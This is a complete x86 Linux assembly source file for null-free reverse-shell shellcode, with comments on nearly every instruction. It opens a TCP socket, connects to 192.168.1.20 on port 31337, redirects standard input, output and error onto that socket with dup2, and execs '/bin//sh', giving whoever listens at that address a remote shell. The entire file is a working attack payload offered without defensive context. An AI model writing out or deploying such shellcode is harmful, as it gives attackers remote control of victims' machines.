BITS 32

;sys_socket(AF_INET, SOCK_STREAM, IP_PROTO)
xor ebx, ebx
mul ebx			;zero out eax,ebx,edx
push BYTE 0x66  ;for socket_call
pop eax
inc bl			;ebx = 1 for sys_socket

;build argument array
push edx
push BYTE 1		;AF_INET
push BYTE 2		;SOCK_STREAM
mov ecx, esp	;ecx points to arg array
int 0x80
xchg eax,esi	;save sockfd
xor eax,eax		;ensure eax is zeroed

;sys_connect(sockfd, [SOCK_STREAM, port, ip], 16)
inc bl 			;bl was 1 from previous call
mov dl, bl 		;dl = 2 for SOCK_STREAM later
inc bl 			;ebx = 3 for sys_connect

;build sockaddr struct
;build ip without nulls
push eax				;push 8byte null value onto stack for ipaddress
mov BYTE [esp], 0xc0 	;192
mov BYTE [esp+1], 0xa8	;168
mov BYTE [esp+2], al	;for 0
mov BYTE [esp+3], 0x14  ;20

push WORD 0x697a	;port = 31337
push WORD dx		;SOCK_STREAM
xor dx,dx
mov ecx, esp

;build arg array
push BYTE 0x10 		;socklen = 16
push ecx 			;sockaddr pointer
push esi			;sockfd
mov ecx, esp		;mov all the args to ecx

push 0x66			;for socket_call
pop eax
int 0x80			;socket_call(3, [sockfd, [SOCK_STREAM, port, ip], 16])



;sys_dup2(newfd, oldfd)
mov ebx, esi		;mov sockfd into ebx for sys_dup2
push BYTE 2			;loop counter
pop ecx

dup_loop:
mov al, 0x3f
int 0x80
dec ecx
jns dup_loop


;sys_execve("/bin//sh")


jmp short sh_string
excve:
pop ebx			;mov pointer to bin/sh to ebx
push eax		;eax is zero after last dup2 call
mov ecx, esp
mov al, 0xb
int 0x80


sh_string:
call excve
db "/bin//sh"
